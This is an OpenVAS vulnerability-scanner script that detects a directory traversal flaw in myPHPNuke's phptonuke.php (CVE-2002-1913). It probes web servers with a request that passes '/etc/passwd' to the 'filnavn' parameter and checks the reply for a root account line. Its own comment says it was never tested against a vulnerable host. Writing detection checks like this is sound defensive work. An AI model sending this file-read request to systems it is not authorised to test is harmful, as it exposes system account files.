###############################################################################
# OpenVAS Vulnerability Test
# $Id: phptonuke_dir_trav.nasl 6053 2017-05-01 09:02:51Z teissa $
#
# myPHPNuke phptonuke.php Directory Traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Status: it was *not* tested against a vulnerable host, and the
# vulnerability is not confirlemed, as far as I know.
#
# Reference:
#
# From:	"Zero-X ScriptKiddy" <zero-x@linuxmail.org>
# To:	bugtraq@securityfocus.com
# Date:	Thu, 17 Oct 2002 05:50:10 +0800
# Subject: phptonuke allows Remote File Retrieving

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11824");
  script_version("$Revision: 6053 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2002-1913");
  script_bugtraq_id(5982);
  script_name("myPHPNuke phptonuke.php Directory Traversal");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://marc.theaimsgroup.com/?l=bugtraq&m=103480589031537&w=2");

  tag_summary = "The remote web server contains a PHP script that allows for reading of
  arbitrary files.

  Description :

  The version of myPHPNuke installed on the remote host allows anyone to
  read arbitrary files by passing the full filename to the 'filnavn'
  argument of the 'phptonuke.php' script.";

  tag_solution = "Upgrade to the latest version.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/phptonuke.php?filnavn=/etc/passwd";

  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
